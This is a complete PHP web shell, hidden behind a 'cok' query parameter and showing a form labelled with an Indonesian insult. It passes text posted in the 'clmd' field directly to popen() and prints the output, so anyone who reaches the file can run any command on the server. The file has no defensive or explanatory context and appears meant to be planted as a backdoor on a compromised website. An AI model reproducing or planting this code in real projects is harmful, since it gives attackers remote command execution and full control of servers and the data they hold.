


<?php
error_reporting(E_ALL);
if (isset($_GET['cok']))
{
echo "<div align='left'><font size='1'>Input tolol :</font></div>
<form name='clmd' method='POST' enctype='multipart/form-data'>
<input type='text' name='clmd' size='30' class='input'><br>
<pre>";
    
}
if (isset($_POST['clmd'])) {
  $clmd=$_POST['clmd'];
  $handle = popen($clmd, 'r');
echo "'$handle'; " . gettype($handle) . "\n";
$read = fread($handle, 2096);
echo $read;
pclose($handle);
  exit;
  }
/* Add redirection so we can get stderr. */

?>
